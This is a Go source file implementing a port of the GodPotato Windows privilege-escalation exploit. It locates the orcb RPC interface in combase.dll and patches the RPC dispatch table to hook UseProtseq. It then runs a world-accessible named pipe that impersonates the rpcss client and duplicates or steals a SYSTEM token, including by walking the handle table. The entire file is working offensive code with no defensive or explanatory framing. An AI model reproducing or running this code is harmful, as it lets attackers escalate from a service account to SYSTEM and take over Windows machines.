package main

import (
	"bytes"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	serverPipe = `\\.\pipe\GodPotato\pipe\epmapper`

	pipeAccessDuplex       = 0x00000003
	pipeUnlimitedInstances = 255
	genericRead            = 0x80000000
	genericWrite           = 0x40000000
	fileShareRead          = 0x00000001
	fileShareWrite         = 0x00000002
	openExisting           = 3
)

// GodPotatoContext mirrors the C++ GodPotatoContext: locate the orcb
// RPC_SERVER_INTERFACE in combase, hook its UseProtseq routine, and run the
// named-pipe server that receives the rpcss impersonation token.
type GodPotatoContext struct {
	CombaseModule         uintptr
	DispatchTablePtr      uintptr
	UseProtseqFunctionPtr uintptr
	UseProtseqParamCount  uint32

	hookCallback uintptr
	isHook       bool
	isStart      bool

	pipeHandle windows.Handle
	tokenCh    chan windows.Handle
	done       chan struct{}
}

func NewGodPotatoContext() *GodPotatoContext {
	c := &GodPotatoContext{
		tokenCh: make(chan windows.Handle, 1),
		done:    make(chan struct{}),
	}
	c.initContext()
	return c
}

func (c *GodPotatoContext) initialized() bool {
	return c.CombaseModule != 0 && c.DispatchTablePtr != 0 &&
		c.UseProtseqFunctionPtr != 0 && c.UseProtseqParamCount >= 4 &&
		c.UseProtseqParamCount <= 14
}

// initContext scans the combase image for `sizeof(RPC_SERVER_INTERFACE)+orcb GUID`.
// Native builds use 96 bytes (8-byte aligned) while some builds pack the
// structure to 4 bytes (84); both layouts are supported, matching the C++ port.
func (c *GodPotatoContext) initContext() {
	if p := utf16Ptr("combase.dll"); p != nil {
		procLoadLibraryW.Call(uintptr(unsafe.Pointer(p)))
	}
	name := utf16Ptr("combase.dll")
	if name == nil {
		return
	}
	base, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(name)))
	if base == 0 {
		logInfo("[!] No combase module found")
		return
	}
	c.CombaseModule = base

	var info moduleInfo
	r, _, _ := procGetModuleInformation.Call(
		procMustGetCurrentProcess(),
		base,
		uintptr(unsafe.Pointer(&info)),
		unsafe.Sizeof(info),
	)
	if r == 0 || info.SizeOfImage == 0 {
		logInfo("[!] GetModuleInformation(combase.dll) failed")
		return
	}

	image := unsafe.Slice((*byte)(unsafe.Pointer(base)), int(info.SizeOfImage))
	within := func(p uintptr) bool {
		return p >= base && p < base+uintptr(info.SizeOfImage)
	}

	for i := 0; i+20 <= len(image); i++ {
		structSize := *(*uint32)(unsafe.Pointer(&image[i]))
		if structSize != 84 && structSize != 96 {
			continue
		}
		if !bytes.Equal(image[i+4:i+20], orcbRPCGUIDBytes) {
			continue
		}

		packed4 := structSize == 84
		dispatchOff := uintptr(48)
		interpreterOff := uintptr(80)
		if packed4 {
			dispatchOff = 44
			interpreterOff = 72
		}

		entry := base + uintptr(i)
		dispatch := readPtr(entry + dispatchOff)
		interpreter := readPtr(entry + interpreterOff)
		if !within(dispatch) || !within(interpreter) {
			continue
		}

		midlDispatch := readPtr(interpreter + 8)   // MIDL_SERVER_INFO.DispatchTable
		procString := readPtr(interpreter + 16)    // MIDL_SERVER_INFO.ProcString
		formatOffsets := readPtr(interpreter + 24) // MIDL_SERVER_INFO.FmtStringOffset
		if !within(midlDispatch) || !within(procString) || !within(formatOffsets) {
			continue
		}

		fmtOffset := readI16(formatOffsets)
		if fmtOffset < 0 {
			continue
		}
		paramCount := readByte(procString + uintptr(fmtOffset) + 19)
		if paramCount < 4 || paramCount > 14 {
			continue
		}

		c.DispatchTablePtr = midlDispatch
		c.UseProtseqFunctionPtr = readPtr(midlDispatch)
		c.UseProtseqParamCount = uint32(paramCount)
		logDebug("[*] orcb RPC_SERVER_INTERFACE at 0x%x (size %d)", entry, structSize)
		return
	}

	logInfo("[!] Cannot find the orcb RPC_SERVER_INTERFACE in combase.dll")
}

func procMustGetCurrentProcess() uintptr {
	p, _, _ := procGetCurrentProcess.Call()
	return p
}

func (c *GodPotatoContext) HookRPC() {
	if c.DispatchTablePtr == 0 {
		return
	}
	cb := callbackFor(c.UseProtseqParamCount)
	if cb == 0 {
		logInfo("[!] No callback for UseProtseqFunctionParamCount=%d", c.UseProtseqParamCount)
		return
	}

	var oldProtect uint32
	r, _, _ := procVirtualProtect.Call(c.DispatchTablePtr, unsafe.Sizeof(uintptr(0)),
		uintptr(pageReadWrite), uintptr(unsafe.Pointer(&oldProtect)))
	if r == 0 {
		logInfo("[!] VirtualProtect(dispatch table) failed")
		return
	}
	writePtr(c.DispatchTablePtr, cb)
	procVirtualProtect.Call(c.DispatchTablePtr, unsafe.Sizeof(uintptr(0)),
		uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))

	c.hookCallback = cb
	c.isHook = true
}

func (c *GodPotatoContext) Restore() {
	if !c.isHook || c.DispatchTablePtr == 0 || c.UseProtseqFunctionPtr == 0 {
		return
	}
	var oldProtect uint32
	r, _, _ := procVirtualProtect.Call(c.DispatchTablePtr, unsafe.Sizeof(uintptr(0)),
		uintptr(pageReadWrite), uintptr(unsafe.Pointer(&oldProtect)))
	if r != 0 {
		writePtr(c.DispatchTablePtr, c.UseProtseqFunctionPtr)
		procVirtualProtect.Call(c.DispatchTablePtr, unsafe.Sizeof(uintptr(0)),
			uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))
	}
	c.isHook = false
}

func (c *GodPotatoContext) Start() bool {
	if !c.isHook || c.isStart {
		logInfo("[!] Context not hooked, cannot start the pipe server")
		return false
	}
	c.isStart = true
	go c.pipeServer()
	return true
}

func (c *GodPotatoContext) WaitToken(timeout time.Duration) windows.Handle {
	select {
	case token := <-c.tokenCh:
		return token
	case <-time.After(timeout):
		return 0
	}
}

func (c *GodPotatoContext) publish(token windows.Handle) {
	select {
	case c.tokenCh <- token:
	default:
		closeHandle(uintptr(token))
	}
}

func (c *GodPotatoContext) Stop() {
	if !c.isStart {
		return
	}
	c.isStart = false

	// Unblock ConnectNamedPipe if the pipe server is still waiting.
	if name := utf16Ptr(serverPipe); name != nil {
		client, _, _ := procCreateFileW.Call(
			uintptr(unsafe.Pointer(name)),
			genericRead|genericWrite,
			fileShareRead|fileShareWrite,
			0, openExisting, 0, 0)
		if client != 0 && client != invalidHandleValue {
			var written uint32
			b := byte(0xaa)
			procWriteFile.Call(client, uintptr(unsafe.Pointer(&b)), 1,
				uintptr(unsafe.Pointer(&written)), 0)
			closeHandle(client)
		}
	}

	select {
	case <-c.done:
	case <-time.After(5 * time.Second):
		logInfo("[!] Pipe server did not stop in time")
	}
}

func (c *GodPotatoContext) pipeServer() {
	// Impersonation and RevertToSelf are per-OS-thread; keep this goroutine
	// pinned so the token does not leak onto another thread.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	var pipe uintptr
	defer func() {
		procRevertToSelf.Call()
		// Closing the pipe mirrors the C++ port: rpcss' pending ResolveOxid
		// then fails and CoUnmarshalInterface returns instead of blocking.
		closeHandle(pipe)
		close(c.done)
	}()

	sd, _ := buildSecurityDescriptor("D:(A;OICI;GA;;;WD)")
	if sd == 0 {
		logInfo("[!] ConvertStringSecurityDescriptorToSecurityDescriptor failed")
		c.publish(0)
		return
	}
	defer procLocalFree.Call(sd)

	sa := securityAttributes{
		Length:             uint32(unsafe.Sizeof(securityAttributes{})),
		SecurityDescriptor: sd,
		InheritHandle:      0,
	}
	name := utf16Ptr(serverPipe)
	var err error
	pipe, _, err = procCreateNamedPipeW.Call(
		uintptr(unsafe.Pointer(name)),
		pipeAccessDuplex,
		0, // PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT
		pipeUnlimitedInstances,
		521, 0, 123,
		uintptr(unsafe.Pointer(&sa)))
	logInfo("[*] CreateNamedPipe %s", serverPipe)
	if pipe == 0 || pipe == invalidHandleValue {
		logInfo("[!] CreateNamedPipe failed: %v", err)
		c.publish(0)
		return
	}
	c.pipeHandle = windows.Handle(pipe)

	connected, _, conErr := procConnectNamedPipe.Call(pipe, 0)
	if connected == 0 {
		if errno, ok := conErr.(syscall.Errno); !ok || uint32(errno) != errorPipeConnected {
			if c.isStart {
				logInfo("[!] ConnectNamedPipe failed: %v", conErr)
			}
			c.publish(0)
			return
		}
	}

	if !c.isStart {
		c.publish(0)
		return
	}

	logInfo("[*] Pipe Connected!")
	var clientPid uint32
	if r, _, e := procGetNamedPipeClientProcessId.Call(pipe, uintptr(unsafe.Pointer(&clientPid))); r != 0 {
		selfPid, _, _ := procGetCurrentProcessId.Call()
		logDebug("[*] pipe client pid=%d (self=%d)", clientPid, selfPid)
	} else {
		logDebug("[!] GetNamedPipeClientProcessId failed: %v", e)
	}
	tidBefore, _, _ := procGetCurrentThreadId.Call()
	imp, _, impErr := procImpersonateNamedPipeClient.Call(pipe)
	tidAfter, _, _ := procGetCurrentThreadId.Call()
	logDebug("[*] pipe thread id: before=%d after=%d", tidBefore, tidAfter)
	if imp == 0 {
		logInfo("[!] ImpersonateNamedPipeClient failed: %v", impErr)
		c.publish(0)
		return
	}

	thread, _, _ := procGetCurrentThread.Call()
	var threadToken uintptr
	opened, _, openErr := procOpenThreadToken.Call(thread,
		uintptr(tokenQuery|tokenDuplicate|tokenImpersonate|tokenAdjustPrivileges|
			tokenAdjustDefault|tokenAdjustSessionID), 1,
		uintptr(unsafe.Pointer(&threadToken)))
	if opened == 0 {
		logInfo("[!] OpenThreadToken(full) failed: %v", openErr)
		// Minimal access fallback: an Anonymous token only grants TOKEN_QUERY.
		opened, _, openErr = procOpenThreadToken.Call(thread, tokenQuery, 1,
			uintptr(unsafe.Pointer(&threadToken)))
		if opened == 0 {
			logInfo("[!] OpenThreadToken(query) failed: %v", openErr)
		}
	}

	level := uint32(0)
	if opened != 0 {
		if name, ok := tokenUserName(windows.Handle(threadToken)); ok {
			logInfo("[*] CurrentUser: %s", name)
		}
		if l, ok := tokenImpersonationLevel(windows.Handle(threadToken)); ok {
			level = l
		}
		logInfo("[*] CurrentsImpersonationLevel: %s", impersonationName(level))

		sid, _ := tokenSID(windows.Handle(threadToken))
		logDebug("[*] thread token: opened=%d level=%d sid=%s", opened, level, sid)
	}

	var systemToken windows.Handle
	if opened != 0 && tokenIsSystem(windows.Handle(threadToken)) && level >= securityImpersonation {
		systemToken = duplicateSystemTokenAsPrimary(windows.Handle(threadToken))
	}
	// Even when the impersonation token cannot be opened (or is only
	// Identification), a SYSTEM primary token can still be stolen by walking
	// the handle table with the privileges we already hold.
	if systemToken == 0 && (opened == 0 || level >= securityImpersonation) {
		logInfo("[*] Start Search System Token")
		systemToken = findSystemToken(windows.Handle(threadToken))
	}

	if systemToken != 0 {
		if name, ok := tokenUserName(systemToken); ok {
			logInfo("[*] Find System Token : true (%s)", name)
		} else {
			logInfo("[*] Find System Token : true")
		}
		c.publish(systemToken)
	} else {
		logInfo("[*] Find System Token : false")
		c.publish(0)
	}

	closeHandle(threadToken)
}

func buildSecurityDescriptor(sddl string) (uintptr, uint32) {
	text := utf16Ptr(sddl)
	if text == nil {
		return 0, 0
	}
	var sd uintptr
	var size uint32
	r, _, _ := procConvertStringSecurityDescriptor.Call(
		uintptr(unsafe.Pointer(text)),
		1, // SDDL_REVISION_1
		uintptr(unsafe.Pointer(&sd)),
		uintptr(unsafe.Pointer(&size)))
	if r == 0 {
		return 0, 0
	}
	return sd, size
}

func impersonationName(level uint32) string {
	switch level {
	case 0:
		return "Anonymous"
	case 1:
		return "Identification"
	case 2:
		return "Impersonation"
	case 3:
		return "Delegation"
	default:
		return "None"
	}
}
